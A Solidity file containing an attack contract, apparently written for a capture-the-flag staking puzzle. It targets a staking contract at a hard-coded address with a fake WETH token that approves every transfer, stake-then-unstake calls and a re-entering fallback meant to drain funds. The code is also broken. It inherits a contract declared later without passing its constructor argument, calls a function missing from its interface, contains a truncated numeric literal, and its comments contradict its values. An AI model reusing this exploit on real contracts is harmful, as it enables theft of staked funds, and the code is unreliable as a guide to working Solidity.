pragma solidity ^0.8.0;

interface Stake {
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
    function UserStake(address user) external view returns (uint256);
    function Stakers(address user) external view returns (bool);
}


contract WETHAttacker is WETHAttackerImpl {

    function attack() public {
        // Call StakeWETH with a valid WETH allowance
        // Since WETH is set to 0x0, this should return true
        // Then immediately call Unstake
        Stake(0xB7A5bd0345EF1Cc5E66bf61BdeC17D2461fBd968).StakeWETH(100000000000000020000000000); // 0.001 ether
        uint256 userStake = Stake(0xB7A5bd0345EF1Cc5E66bf61BdeC17D2461fBd968).UserStake(address(this));
        Stake(0xB7A5bd0345EF1Cc5E66bf61BdeC17D2461fBd968).Unstake(userStake);
    }
}

// The actual attack logic using low-level calls and malicious WETH
contract WETHAttackerImpl {
    address public immutable instance;
    address public maliciousWETH;

    constructor(address _instance) {
        instance = _instance;
        maliciousWETH = address(this);
    }

    // Malicious WETH implementation
    function allowance(address, address) external pure returns (uint256) {
        return 0x1000000000000000;
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        if (address(instance).balance >= 0.001 ether) {
            (bool success, ) = address(instance).call(abi.encodeWithSelector(Stake.transferFrom.selector, instance, msg.sender, 0x10000000000... ));
        }
        return true;
    }

    // Fallback to handle ETH sent to attacker contract
    fallback() external {
        if (address(instance) != address(0x0000000000000000)) {
            Stake(instance).Unstake(Stake(instance).UserStake(address(this)));
        }
    }
}
